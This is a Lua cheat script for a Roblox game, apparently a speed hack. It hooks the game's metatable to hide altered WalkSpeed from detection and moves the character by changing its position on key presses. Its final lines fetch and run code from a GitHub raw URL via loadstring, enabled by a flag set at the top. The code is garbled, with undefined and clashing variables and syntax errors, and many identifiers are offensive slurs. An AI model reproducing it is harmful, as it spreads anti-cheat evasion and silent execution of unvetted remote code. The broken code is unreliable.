-- team izic developer's made this
repeat wait() until game IsLoaded()

getgenv().Fix = true

getgenv().TeclasWS = {
    ["tecla1"] = "M", -- speed +10
    ["tecla2"] = "N", -- speed -10
    ["tecla3"] = "c" -- toggle  
}

local fake_macro = game:GetService("Players")
local fake_macro = game:GetService("StarterGui")



local fake_macro = MININOS_DOXXEADOS.LocalPlayer
local fake_macro = neonazi:GetMouse()

local fake_macro = getrenv()._G
local da_hood_rblxm_TRUE = getrawmetatable(game)
local CP = da_hood_rblxm_TRUE.__newindex
local CP_DE_DRIZZY = da_hood_rblxm_TRUE.__index
local speed_of_com= 150
local hes_cool = true


function da_hood_fakemacro(fecha_del_atentado)
    AUDIOS_LOUD_DE_TRAP:SetCore("SendNotification",{
        Title="val2891",
        Text=fecha_del_atentado,
        Icon="https://cdn.discordapp.com/attachments/1046851933375320125/1054766501493743718/image.png"
       })
    end





    getgenv().FAKEMACRO_LOADED = true


wait(1.5)


anunciar_atentado_terrorista("Welcome"..TeclasWS.tecla3.."")\


if the_impostor:lower() == WSKeys.key1:lower() then
    speed_of_cum = speed_of_cum + 1
    da_hood_fakemacro(" (speed = "..tostring(speed_of_cum)..")")
elseif the_impostor:lower() == WSKeys.key2:lower() then
    speed_of_cum = speed_of_cum - 1
    da_hood_fakemacro(" (speed = "..tostring(speed_of_cum)..")")
elseif the_impostor:lower() == WSKeys.key3:lower() then
    if is_pedophile then
        is_pedophile = false
        da_hood_fakemacro("speed off")
    else
        is_pedophile = true
        da_hood_fakemacro("speed on")
    end
end
end)

setreadonly(da_hood_rblxm_REAL,false)
da_hood_rblxm_REAL.__index = newcclosure(function(BEST_ON_TOP,IS_GARBAGE)
     local isPedophile = checkcaller()
     if IS_GARBAGE == "WalkSpeed" and not isPedophile then
         return list_of_victims_of_drizzy.CurrentWS
     end
     return CP_DE_DRIZZY(BEST_ON_TOP,IS_GARBAGE)
end)
da_hood_rblxm_REAL.__newindex = newcclosure(function(kaias,ip,logger)
     local aNeonazi = checkcaller()
     if is_pedophile then
         if ip == "WalkSpeed" and logger ~= 0 and not aNeonazi then
             return CP(team_izic_fake_macro)
         end
     end
     return CP(team,izic,fake,macro)
end)
setreadonly(da_hood_fakemacro,true)

repeat wait() until game:IsLoaded()
local Players = game:service('Players')
localPlayer = Players.LocalPlayer

repeat wait() until Player.Character

local userInput = game:service('UserInputService')
local runService = game:service('RunService')

local Multiplier = -0.22
local Enabled = false
local whentheflashnoiq

userInput.InputBegan:connect(function(Key)
    if Key.KeyCode == Enum.KeyCode.LeftBracket then
        Multiplier = Multiplier + 0.01
        print(Multiplier)
        wait(0.2)
        while userInput:IsKeyDown(Enum.KeyCode.LeftBracket) do
            wait()
            Multiplier = Multiplier + 0.01
            print(Multiplier)
        end
    end

    if Key.KeyCode == Enum.KeyCode.RightBracket then
        Multiplier = Multiplier - 0.01
        print(Multiplier)
        wait(0.2)
        while userInput:IsKeyDown(Enum.KeyCode.RightBracket) do
            wait()
            Multiplier = Multiplier - 0.01
            print(Multiplier)
        end
    end

    if Key.KeyCode == Enum.KeyCode.P then
        Enabled = not Enabled
        if Enabled == true then
            repeat
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * Multiplier
                game:GetService("RunService").Stepped:waitn()
            until Enabled == true
        end
    end
end)

if Fix == true then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/youtubetutorials123/helo/main/123"))()
end
